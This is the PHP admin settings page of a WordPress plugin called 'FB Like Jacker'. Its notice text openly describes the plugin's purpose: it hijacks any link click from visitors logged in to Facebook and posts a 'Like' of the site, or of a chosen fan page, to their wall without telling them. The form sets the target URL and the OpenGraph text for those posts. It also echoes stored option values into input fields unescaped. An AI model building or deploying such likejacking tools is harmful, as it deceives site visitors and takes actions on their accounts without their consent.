<?php
    $is_active = get_option("fblikejacker_is_active");
    $debug_mode = get_option("fblikejacker_debug_mode");
    $like_active = get_option("fblikejacker_like_active");
    $link_like = get_option("fblikejacker_link_like");
    
    $og_title = get_option("fblikejacker_og_title");
    $og_desc = get_option("fblikejacker_og_desc");
    $og_img = get_option("fblikejacker_og_img");
    
    if ($like_active != '0' && $like_active != '1') $like_active = "1";

    if ($is_active == '1') $is_active = 'checked="checked"';
    else $is_active = "";
    
    if ($like_active != '0') $like_active = 'checked="checked"';
    else $like_active = "";

    if ($debug_mode != '0') $debug_mode = 'checked="checked"';
    else $debug_mode = "";
    
?>
<script>
function toggleViewActive() {
    if (jQuery('#is_active').attr('checked')) {
        jQuery('#allContent').show();
    } else {
        jQuery('#allContent').hide();        
    }
}
function toggleViewURL() {
    if (jQuery('#like_active').attr('checked')) {
        jQuery('#customUrl').hide();
        jQuery('#ogTitle').show();
        jQuery('#ogDesc').show();
        jQuery('#ogImg').show();
    } else {
        jQuery('#customUrl').show();        
        jQuery('#ogTitle').hide();
        jQuery('#ogDesc').hide();
        jQuery('#ogImg').hide();
    }
}

	</script>
        

<div class="wrap">
<style type="text/css">
    
    <?php
    if ( is_rtl() ) {
    ?>
    
    body {
        direction:rtl;
        unicode-bidi: embed;        
    }
    
    .icon32 {float:right}
    
    h3 a,h2 a {font-size:80%;text-decoration:none;margin-right:10px;}
    
    <?
    } else {
    ?>    
    
    h3 a,h2 a {font-size:80%;text-decoration:none;margin-left:10px;}
    
    <?    
    }
    ?>
    
</style>

    <div id="icon-edit" class="icon32"></div><h2><?php _e("FB Like Jacker","fblikejacker") ?> <a href="?page=fblikejacker-main"><?php _e("&rarr; Visitors Automatically “Like” Your Content ","fblikejacker") ?></a></h2>

<div class="updated"><p>
The plugin will only work on those visitors that are <strong>logged in to Facebook</strong> when they’re visiting your website.<br/><br/>
When it detects that one of your visitors are logged in to their Facebook account and they click ANY link on your site, the plugin hijacks that click and actually posts a “Like” to their Facebook wall about your content.<br/>
It works exactly as if they had clicked a “Like” button on your site but without alerting the visitor of what’s just happened.
</p></div>
    
<div class="updated"><p>
        <strong>New in version 0.07</strong> : If you select the &laquo; Like Active Content &raquo; mode, and you enter OpenGraph Title & OpenGraph Description, your like Title & Content will be automatically replaced. The OpenGraph Image is optional.
        
        <br/>Facebook OpenGraph Debugger: <a href="http://developers.facebook.com/tools/debug/og/object?q=<?=urlencode(site_url());?>" target="_blank">http://developers.facebook.com/tools/debug</a>
</p></div>
    
    
            <form method="post" action="?page=fblikejacker-main&action=save-config">
            <table>
                <tr height="60px">
                    <td  style="font-size:15pt;" width="230px;">Plugin Active:</td> 
                    <td><input id="is_active"  type="checkbox" name="is_active" onclick="toggleViewActive();" <?php echo $is_active;?> /></td>
                </tr>
            </table>
            <table id="allContent" <?php if ($is_active == '') echo 'style="display:none"';?>>

                <tr height="60px">
                    <td style="font-size:15pt;" width="230px;">Like Active Content:</td> 
                    <td>
                        <input  type="checkbox" id="like_active" name="like_active" onclick="toggleViewURL();" <?php echo $like_active;?> />
                        <br/>
                        <small><i>If Checked, The Visitor Will Like Active Page</i></small>
                    </td>
                </tr>
                
                <tr id="customUrl" height="60px" <?php if ($like_active != '') echo 'style="display:none"';?>>
                    <td style="font-size:15pt;" width="230px;">Custom URL to like:</td> 
                    <td>
                        <input  type="text" style="width:400px;font-size:14pt;" name="link_like"  value="<?php echo $link_like;?>" /><br/>
                        <small><i>You can Enter Fan Page Here, The Visitors Will Automatically Like It<br/>But Your Page Will not Be Shared On This Wall<br/>i.e.:http://facebook.com/geek247</i>
                            </small>
                    </td>
                </tr>
                
                
                <tr id="ogTitle" height="60px" <?php if ($like_active != 'checked="checked"') echo 'style="display:none"';?>>
                    <td style="font-size:15pt;" width="230px;">OpenGraph Title:</td> 
                    <td>
                        <input  type="text" style="width:400px;font-size:14pt;" name="og_title"  value="<?php echo $og_title;?>" />
                    </td>
                </tr>
                <tr id="ogDesc" height="60px" <?php if ($like_active != 'checked="checked"') echo 'style="display:none"';?>>
                    <td style="font-size:15pt;" width="230px;">OpenGraph Description:</td> 
                    <td>
                        <input  type="text" style="width:400px;font-size:14pt;" name="og_desc"  value="<?php echo $og_desc;?>" />
                    </td>
                </tr>
                <tr id="ogImg" height="60px" <?php if ($like_active != 'checked="checked"') echo 'style="display:none"';?>>
                    <td style="font-size:15pt;" width="230px;">OpenGraph Image:</td> 
                    <td>
                        <input  type="text" style="width:400px;font-size:14pt;" name="og_img"  value="<?php echo $og_img;?>" />
                    </td>
                </tr>
                
                <tr height="60px">
                    <td style="font-size:15pt;" width="230px;">Debug Mode:</td> 
                    <td>
                        <input  type="checkbox" id="debug_mode" name="debug_mode" <?php echo $debug_mode;?> />
                    </td>
                </tr>

            </table>
    <input class="button button-primary" type="submit" value="Save "><br/>
</form>
    
<br/>


</div>
